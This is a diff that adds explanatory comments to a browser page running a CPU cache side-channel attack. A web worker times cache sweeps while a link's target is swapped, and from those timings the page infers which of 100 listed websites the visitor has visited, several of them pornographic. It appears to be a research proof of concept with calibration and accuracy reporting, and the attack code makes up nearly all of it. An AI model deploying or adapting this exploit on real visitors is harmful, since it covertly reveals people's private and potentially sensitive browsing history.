@@ -26,7 +26,6 @@
 				</td>
 			</tr>
 		</table>
-
 		<a id="a0" class="attack"></a>
 
 		<div id="res"></div>
@@ -34,7 +33,7 @@
 		<div id="unvisited-div"></div>
 		
 		<script>
-			// variables and constants
+			// variables and constants for CPU Cache-Based Side Channel
 			const COUNT_SWEEPS = true;
 			var CACHE_SETS = 4096; var CACHE_WAYS = 16;
 			var MEASUREMENT_TIME_IN_MS = 2500;
@@ -46,6 +45,7 @@
 		</script>
 
 		<script id="cacheWorkerSource" <!-- -->type = "javascript/worker" >
+			// WORKER THREAD
 			// worker constants
 			0; // otherwise VSCode complains...
 			const BYTES_PER_MB = 1024*1024;
@@ -223,20 +223,37 @@
 		</script>
 		
 		<script>
+			// MAIN THREAD
+
+			// number of baseline samples for visited and unvisited
 			const num_of_attempts = 10;
+			// text used to populate the <a> tag
 			const BASE_TEXT = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
+			// handle to requestAnimationFrame API
 			requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame || window.msRequestAnimationFrame;
-
+			// 50 URLs for visited state, used for validation
 			var visited_urls = ["https://www.google.com/", "https://www.youtube.com/", "https://www.pornhub.com/", "https://www.facebook.com/", "https://www.reddit.com/", "https://www.amazon.com/", "https://twitter.com/", "https://www.xvideos.com/", "https://www.yahoo.com/", "https://www.wikipedia.org/", "https://weather.com/", "https://www.fandom.com/", "https://www.instagram.com/", "https://duckduckgo.com/", "https://www.walmart.com/", "https://www.xnxx.com/", "https://www.bing.com/", "https://www.tiktok.com/", "https://xhamster.com/", "https://www.ebay.com/", "https://www.cnn.com/", "https://onlyfans.com/", "https://www.taboola.com/", "https://www.usps.com/", "https://www.twitch.tv/", "https://www.quora.com/", "https://www.foxnews.com/", "https://www.espn.com/", "https://chaturbate.com/", "https://www.nytimes.com/", "https://www.tremendous.com/", "https://www.imdb.com/", "https://www.paypal.com/us/home", "https://outlook.live.com/owa/", "https://www.etsy.com/", "https://www.linkedin.com/feed/", "https://gamerant.com/", "https://www.netflix.com/", "https://www.office.com/", "https://simpcity.su/", "https://www.accuweather.com/", "https://www.ups.com/us/en/global.page", "https://www.microsoft.com/en-us/?ql=4", "https://discord.com/", "https://www.msn.com/", "https://www.pinterest.com/", "https://www.dailymail.co.uk/ushome/index.html", "https://www.blogger.com/about/?bpli=1", "https://www.apple.com/", "https://www.indeed.com/"];
+			// 50 URLs for unvisited state, used for validation
 			var unvisited_urls = ["https://www.bestbuy.com/", "https://www.fedex.com/global/choose-location.html", "https://zoom.us/", "https://www.tumblr.com/", "https://www.target.com/", "https://stripchat.com/", "https://www.ign.com/" , "https://www.ign.com/", "https://nypost.com/", "https://www.patreon.com/", "https://www.zillow.com/", "https://www.gamespot.com/", "https://open.spotify.com/?", "https://www.samsung.com/us/", "https://www.livejasmin.com/en/girls/", "https://www.homedepot.com/", "https://www.roblox.com/", "https://www.erome.com/", "https://www.eporner.com/", "https://www.capitalone.com/", "https://github.com/", "https://www.marca.com/", "https://newyork.craigslist.org/", "https://www.hulu.com/welcome", "https://www.instructure.com/", "https://steamcommunity.com/", "https://www.xfinity.com/national/", "https://www.bbc.com/", "https://www.chase.com/", "https://gogoanime.gr/", "https://www.youporn.com/", "https://www.t-mobile.com/", "https://www.usatoday.com/", "https://wordpress.com/", "https://www.healthline.com/", "https://www.lowes.com/", "https://www.washingtonpost.com/", "https://www.adobe.com/", "https://quizlet.com/", "https://www.yelp.com/", "https://www.microsoft.com/en-us/microsoft-365/sharepoint/collaboration?ms.officeurl=sharepoint&rtc=1", "https://www.att.com/", "https://aws.amazon.com/", "https://nextdoor.com/", "https://www.android.com/", "https://linktr.ee/", "https://www.macys.com/", "https://www.cnbc.com/", "http://microsoftonline.com/", "http://dood.re/"];
+			// 100 test URLs used during the attack
 			var urls = ["https://www.google.com/", "https://www.youtube.com/", "https://www.pornhub.com/", "https://www.facebook.com/", "https://www.reddit.com/", "https://www.amazon.com/", "https://twitter.com/", "https://www.xvideos.com/", "https://www.yahoo.com/", "https://www.wikipedia.org/", "https://weather.com/", "https://www.fandom.com/", "https://www.instagram.com/", "https://duckduckgo.com/", "https://www.walmart.com/", "https://www.xnxx.com/", "https://www.bing.com/", "https://www.tiktok.com/", "https://xhamster.com/", "https://www.ebay.com/", "https://www.cnn.com/", "https://onlyfans.com/", "https://www.taboola.com/", "https://www.usps.com/", "https://www.twitch.tv/", "https://www.quora.com/", "https://www.foxnews.com/", "https://www.espn.com/", "https://chaturbate.com/", "https://www.nytimes.com/", "https://www.tremendous.com/", "https://www.imdb.com/", "https://www.paypal.com/us/home", "https://outlook.live.com/owa/", "https://www.etsy.com/", "https://www.linkedin.com/feed/", "https://gamerant.com/", "https://www.netflix.com/", "https://www.office.com/", "https://simpcity.su/", "https://www.accuweather.com/", "https://www.ups.com/us/en/global.page", "https://www.microsoft.com/en-us/?ql=4", "https://discord.com/", "https://www.msn.com/", "https://www.pinterest.com/", "https://www.dailymail.co.uk/ushome/index.html", "https://www.blogger.com/about/?bpli=1", "https://www.apple.com/", "https://www.indeed.com/", "https://www.bestbuy.com/", "https://www.fedex.com/global/choose-location.html", "https://zoom.us/", "https://www.tumblr.com/", "https://www.target.com/", "https://stripchat.com/", "https://www.ign.com/", "https://www.ign.com/", "https://nypost.com/", "https://www.patreon.com/", "https://www.zillow.com/", "https://www.gamespot.com/", "https://open.spotify.com/?", "https://www.samsung.com/us/", "https://www.livejasmin.com/en/girls/", "https://www.homedepot.com/", "https://www.roblox.com/", "https://www.erome.com/", "https://www.eporner.com/", "https://www.capitalone.com/", "https://github.com/", "https://www.marca.com/", "https://newyork.craigslist.org/", "https://www.hulu.com/welcome", "https://www.instructure.com/", "https://steamcommunity.com/", "https://www.xfinity.com/national/", "https://www.bbc.com/", "https://www.chase.com/", "https://gogoanime.gr/", "https://www.youporn.com/", "https://www.t-mobile.com/", "https://www.usatoday.com/", "https://wordpress.com/", "https://www.healthline.com/", "https://www.lowes.com/", "https://www.washingtonpost.com/", "https://www.adobe.com/", "https://quizlet.com/", "https://www.yelp.com/", "https://www.microsoft.com/en-us/microsoft-365/sharepoint/collaboration?ms.officeurl=sharepoint&rtc=1", "https://www.att.com/", "https://aws.amazon.com/", "https://nextdoor.com/", "https://www.android.com/", "https://linktr.ee/", "https://www.macys.com/", "https://www.cnbc.com/", "http://microsoftonline.com/", "http://dood.re/"];
-
+			// the variable shared between worker and main threads
 			var bufferSharedArray = new SharedArrayBuffer(Int32Array.BYTES_PER_ELEMENT); var sharedVariable = new Uint32Array(bufferSharedArray);
+
+			// handles for worker thread, <a> tag, UI table, as well as parameters for 
+			// phase (calibration vs test), visited flag and swap used for URL changing pattern during
+			// repaint, attempt number out of 10 during calibration, and url index out of 100 test URLs
 			var myWorker, targetNode, paramsTable, phase, visited_flag, swap, attempt_number, url_index;
+			
+			// baseline values for visited and unvisited
 			var med_visited, med_unvisited;
+			// time base as when the attack starts either for calibration or test
+			// as well as time taken to calibrate and test the URLs
 			var time_base, time_calibrate, time_test;
+			// variables used to collect and process the side channel measurements
 			var measurement_values = [], measure_sweeps = [];
 
+			// generate the text with defined length
 			function arbitraryLengthText(inputText, requestedLength) {
 				let outputString = inputText;
 				while (outputString.length < requestedLength) {
@@ -245,6 +262,7 @@
 				return outputString.substring(0, requestedLength);
 			}
 
+			// shuffle the array
 			// https://stackoverflow.com/questions/2450954/how-to-randomize-shuffle-a-javascript-array
 			function shuffle(array) {
 				let currentIndex = array.length,  randomIndex;
@@ -257,6 +275,7 @@
 				return array;
 			}
 
+			// median of array
 			function median(arr) {
 
 				arr = arr.sort(function (a, b) { return a - b });
@@ -271,10 +290,12 @@
 				}
 			}
 
+			// set the size of LLC
 			function resizeSets() { CACHE_SETS = parseInt(document.getElementById("csets").value); }
-
+			// set the number of cache ways in LLC
 			function resizeWays() { CACHE_WAYS = parseInt(document.getElementById("cways").value); }
 
+			// listener for messages from worker thread
 			function handleMessageFromWorker(msg) {
 				if(phase == "calibrate") {
 					report_base();
@@ -283,6 +304,7 @@
 				}
 			}
 
+			// prepare the worker thread for CPU cache side channel measurements
 			function CPUPrep() {
 				let blob = new Blob([
 					document.querySelector('#cacheWorkerSource').textContent
@@ -292,127 +314,191 @@
 				myWorker.postMessage({type:CREATE_PP_OBJECT, sets: CACHE_SETS, ways: CACHE_WAYS});
 			}
 
+			// start the side channel measurements in the worker thread
 			function CPUGo(tt) {
 				sharedVariable[0] = 0;
 				myWorker.postMessage({type:PERFORM_MEASUREMENT, measurement_time : tt, set_skipping_step : SET_SKIPPING_STEP, count_sweeps: COUNT_SWEEPS, buff: [bufferSharedArray]});
 			}
 
+			// terminate the worker thread
 			function CPUStop() { myWorker.postMessage({type:DELETE_PP_OBJECT}); }
 			
+			// set the text inside the <a> tag
 			function resizeText() { document.getElementById('a0').innerText = arbitraryLengthText(BASE_TEXT, Math.pow(2,10)*parseInt(document.getElementById("textLength").value)); }
 
+			// initialize the attack
 			function init() {
+				// shared variable initialized to 0
 				sharedVariable[0] = 0;
+				// hide the HTML tags used for reporting the attack results
 				document.getElementById("res").innerText = '';
 				document.getElementById("visited-div").innerHTML = '';
 				document.getElementById("unvisited-div").innerHTML = '';
+				// prepare the worker thread for side channel meaurements
 				resizeSets(); resizeWays(); CPUPrep();
+				// set the text inside the <a> tag and shuffle the 100 test URLs
 				resizeText(); shuffle(urls);
+				// set the handle to the <a> tag and UI table
 				targetNode = document.getElementById('a0'); paramsTable = document.getElementById('tbl-params');
+				// start the calibration (baseline measurements)
 				go_base();
 			}
 
+			// calibration phase of the attack
 			function go_base() {
+				// hide the UI and display the <a> tag
 				paramsTable.style.display = "none"; targetNode.style.display = 'block';
+				// initialize the paramaters
 				phase = "calibrate", swap = false, attempt_number = 0, visited_flag = true, measurement_values = [];
+				// initialize the <a> tag to a randomly generated unvisited URL
 				targetNode.href = 'http://notvisited' + ((Math.random() * 100000000) | 0) + '.foo'; targetNode.style.color = 'white'; targetNode.style.color = '';
+				// start side channel measurements
 				CPUGo(2000);
+				// set the start time
 				time_base = performance.now();
+				// set the callback for repaint
 				requestAnimationFrame(onAnimateBase);
 			}
 
+			// repaint callback for baseline measurements
 			function onAnimateBase() {
+				// check if reached the number of attempts for visited state, and
+				// if so, change the flag to start measurements for unvisited state,
 				if(visited_flag && attempt_number == num_of_attempts) visited_flag = false;
+				// check if reached end of measurements
 				if(attempt_number == (num_of_attempts*2)) {
+					// last measurement value
 					measurement_values[attempt_number] = sharedVariable[0];
+					// calculate the calibration time
 					time_calibrate = (performance.now() - time_base).toFixed(3);
 					return;
 				}
+				
 				if(swap) {
+					// second call in Method A
 					swap = false;
 					targetNode.href = 'http://notvisited' + ((Math.random() * 100000000) | 0) + '.foo'; targetNode.style.color = 'white'; targetNode.style.color = '';
 				} else {
+					// first call in Method A
 					swap = true;
 					if(visited_flag) {
+						// attempt to measure visited baseline?
 						targetNode.href = location.href; targetNode.style.color = 'white'; targetNode.style.color = '';
 					} else {
+						// or attempt to measurem the unvisited baseline
 						targetNode.href = 'http://notvisited' + ((Math.random() * 100000000) | 0) + '.foo'; targetNode.style.color = 'white'; targetNode.style.color = '';
 					}
+					// collect the side channel measurement
 					measurement_values[attempt_number] = sharedVariable[0]; attempt_number++;
 				}
+				// set the callback for repaint
 				requestAnimationFrame(onAnimateBase);
 			}
 
+			// when worker thread finishes the calibration measurements,
+			// calculated the medians for visited vs unvisited as baseline
 			function report_base() {
+				// measurements in calibration phase are finished
 				phase = "finished_calibrate!";
 				
+				// get the measurements for visited baseline
 				measure_sweeps = [];
 				for(let i = 0; i < num_of_attempts; i++) {
 					measure_sweeps[i] = measurement_values[i+1] - measurement_values[i];
 				}
+				// median of visited as baseline
 				med_visited = median(measure_sweeps);
 				
+				// get the measurements for unvisited baseline
 				measure_sweeps = [];
 				for(let i = num_of_attempts; i < (num_of_attempts*2); i++) {
 					measure_sweeps[i-num_of_attempts] = measurement_values[i+1] - measurement_values[i];
 				}
+				// median of unvisited as baseline
 				med_unvisited = median(measure_sweeps);
 				
+				// start testing with 100 target URLs
 				go_test();
 			}
 
+			// test phase of the attack
 			function go_test() {
+				// hide the UI table and show the <a> tag
 				paramsTable.style.display = "none"; targetNode.style.display = 'block';
+				//initiate the variables
 				phase = "test"; swap = false; url_index = 0; measurement_values = [];
+				// set the <a> tag to a randomly generated unvisited URL
 				targetNode.href = 'http://notvisited' + ((Math.random() * 100000000) | 0) + '.foo'; targetNode.style.color = 'white'; targetNode.style.color = '';
+				// start cache side channel measurements
 				CPUGo(5000);
+				// record the start time of attack
 				time_base = performance.now();
+				// set callback for repaint
 				requestAnimationFrame(onAnimateTest);
 			}
 
+			// callback for repaint to test 100 target URLs
 			function onAnimateTest() {
+				// check if still didn't reach to theend test of URLs
 				if(url_index < 100) {
 					if(swap) {
+						// second call in Method A
 						swap = false;
 						targetNode.href = 'http://notvisited' + ((Math.random() * 100000000) | 0) + '.foo'; targetNode.style.color = 'white'; targetNode.style.color = '';
 					} else {
+						// first call in Metohd A
 						swap = true;
 						targetNode.href = urls[url_index]; targetNode.style.color = 'white'; targetNode.style.color = '';
 						measurement_values[url_index] = sharedVariable[0]; url_index++;
 					}
+					// set the callback for repaint
 					requestAnimationFrame(onAnimateTest);
 				} else {
+					// collect the final measurement
 					measurement_values[url_index] = sharedVariable[0];
+					// calculate the attack time
 					time_test = (performance.now() - time_base).toFixed(3);
 					return;
 				}
 			}
-
+			// predict the URL state based on measurements
 			function report_test() {
+				// side channel measurements for 100 URLs are finished
 				phase = "finished!";
+				// hide the <a> tag and show the UI table
 				targetNode.style.display = 'none'; paramsTable.style.display = "inline";
+				// get the andle to HTML tags to show the attack results
 				document.getElementById("res").style.color = 'black'; document.getElementById("res").style.font = "10px";
+				// get the handle to HTML tags to show the list of predicted visited vs unvisited URLs
 				document.getElementById("visited-div").innerHTML = '</br><b>Visited URLs:</b></br>';
 				document.getElementById("unvisited-div").innerHTML = '</br><b>Unvisited URLs:</b></br>';
-
+				// variables to count number of correct predictions for visited and unvisited URLs
 				let true_count_visited = 0, true_count_unvisited = 0;
+				// variables for state and side channel measurement for each URL
 				let states = [], sweeps = [];
+				// variables to current URL index and measurement
 				let curr_idx, curr_trace;
+				// predict for each URL based on side channel measurement
 				for(curr_idx = 0; curr_idx < 100; curr_idx++) {
-
+					// the difference between two measurements is used for a URL
 					curr_trace = measurement_values[curr_idx+1] - measurement_values[curr_idx];
-
+					
 					if(Math.abs(curr_trace - med_visited) < Math.abs(curr_trace - med_unvisited)) {
+						// if current trace is closer to visited baseline it is predicted as visited
 						document.getElementById("visited-div").innerHTML += '<a href=' + urls[curr_idx] + ' >' + urls[curr_idx] + '</a></br>';
+						// if the prediction is correct, increment the number of correct predictions for visited
 						if(visited_urls.indexOf(urls[curr_idx]) > -1) true_count_visited++;
 					} else {
+						// if current trace is closer to unvisited baseline it is predicted as unvisited
 						document.getElementById("unvisited-div").innerHTML += '<a href=' + urls[curr_idx] + ' >' + urls[curr_idx] + '</a></br>';
+						// if the prediction is correct, increment the number of correct predictions for unvisited
 						if(unvisited_urls.indexOf(urls[curr_idx]) > -1) true_count_unvisited++;
 					}
+					// record the actual state and measuremnet for the URL
 					states[curr_idx] = visited_urls.indexOf(urls[curr_idx]) > -1 ? 1 : 0;
 					sweeps[curr_idx] = curr_trace;
 				}
-				
+				// report the attack results in the UI
 				let resultNode = document.getElementById("res");
 				resultNode.innerText += "\n Visited Median: " + med_visited;
 				resultNode.innerText += "\n Unvisited Median: " + med_unvisited;
@@ -424,7 +510,8 @@
 				resultNode.innerText += "\n Test Time : " + (time_test/1000).toFixed(3) + "s";
 				//resultNode.innerText += "\n state: " + states;
 				//resultNode.innerText += "\n sweeps: " + sweeps;
-
+				
+				// terminate the worker thread
 				CPUStop();
 			}
 		</script>
